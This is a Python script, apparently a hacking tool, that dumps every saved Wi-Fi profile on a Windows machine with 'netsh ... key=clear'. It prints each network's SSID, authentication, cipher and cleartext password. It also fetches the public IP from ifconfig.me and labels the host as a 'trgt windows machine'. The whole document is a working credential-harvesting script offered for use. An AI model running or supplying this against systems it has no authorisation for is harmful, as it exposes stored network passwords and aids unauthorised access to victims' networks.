import subprocess
from termcolor import colored

def setting_up():

	global data
	# list of commands to list down available SSID names
	l1 = ["cmd.exe",'netsh', 'wlan', 'show', 'profiles']
	creds = [] # creating empty list
	data = subprocess.check_output(l1).decode('utf-8')
	data = data.split('\n') # making list

def wan_ip():

	print('[+] Acquiring creds... ')
	p = subprocess.Popen(["powershell.exe", "(Invoke-WebRequest ifconfig.me/ip).Content.Trim()"], stdout=subprocess.PIPE)
	out = p.communicate()[0]  #  extracting the wan ip
	out = out.decode('utf-8') # decoding 
	out = out.rstrip("\r\n")  # stripping off EOL 

	return out

def main(data):

	# Getting SSID
	for i in data:
		if "All User Profile" in i:
			u_profiles= []
			u_profile = i.split(":")[1][1:-1] # stripping out SSID name
			#print(u_profile)
			u_profiles.append(u_profile)
			
			#print(u_profiles)
			
			# Getting wifi network profiles
			for j in u_profiles:
				l2 = ['netsh', 'wlan', 'show', 'profile', j, 'key=clear']

				results = subprocess.check_output(l2).decode('utf-8')
				results = results.split('\n') # making list

				# Getting wifi network creds
				for cred in results:
					# Credentials parameters
					auth = "Authentication"
					mode = "Cipher"
					key = "Security key"
					passwd = "Key Content"
					ssid = "SSID name"
					name = "Name"

					if name in cred:
						creds = cred.split(":")[1][1:-1]
						print(colored("++++++++++++++++++++++++++++++++++++++",'green'))
						print("|", name,":",creds,"|")
						print(colored("++++++++++++++++++++++++++++++++++++++",'green'))

					if ssid in cred:
						creds = cred.split(":")[1][1:-1]
						print(ssid,":",creds)

					if auth in cred:
						creds = cred.split(":")[1][1:-1]
						print(auth,":",creds)

					if mode in cred:
						creds = cred.split(":")[1][1:-1]
						if creds != "None":
							print(mode,":",creds)
						else:
							print(mode,":",creds)
							print("-"*50)

							continue

					if key in cred:
						creds = cred.split(":")[1][1:-1]
						if creds != "Absent":							
							print(key,":",creds)
						else:
							continue 

					if passwd in cred:
						creds = cred.split(":")[1][1:-1]
						print(passwd,":",creds)
						print("-"*50)


if __name__ == "__main__":

# Printing trgt's wan.public ip
	print("")
	w = wan_ip()
	print(colored("[+] Wan/Public ip of trgt windows machine: ", 'cyan')+w)
	print("")	
	setting_up()
	main(data)